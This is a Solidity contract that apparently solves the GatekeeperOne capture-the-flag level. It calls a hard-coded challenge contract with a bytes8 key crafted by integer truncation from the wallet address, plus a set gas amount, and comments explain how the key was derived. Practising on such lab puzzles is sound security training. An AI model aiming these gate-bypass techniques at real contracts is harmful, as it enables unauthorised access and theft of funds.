// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
/*
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }
*/

interface GatekeeperOne {



  function enter(bytes8 _gateKey) external returns (bool);
}
contract GatekeeperOneHack {
  GatekeeperOne gate = GatekeeperOne(address(0x11De1A022143cC72D0D7A547B6aFEED603497586));


  //Each hexadecimal character is 4 bits, 2 hex characters = 1 byte
  //8 bits in a byte
  //uint16 = 16 bits = 2 bytes = 4 hex digit represenation 
  //uint32 = 32 bits = 4 bytes = 8 hex digits
  function hack() public {
    //Needs to be 16 digits long
    //_gateKey = 0x1122334455667788;

    // require(uint32(uint64(_gateKey)) == uint16(tx.origin)
    //Last 4 digits should be the last 4 digits of the wallet address
    //Next 4 digits in front of that need to be 0
    //0x00003C7d
    //_gateKey = 0x1122334400003C7d;

    //uint32(uint64(_gateKey)) != uint64(_gateKey)
    //This is already true, one character after 00003C7d just needs to be non zero
    //_gateKey = 0x1122334400003C7d;

    //require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
    //This is also already true, last 8 digits need to equal the last 4
    bytes8 _gateKey = 0x1122334400003C7d;

    gate.enter.gas(99999)(_gateKey);


    //gate.enter{gas: 8191}(_gateKey);
  }


  
}

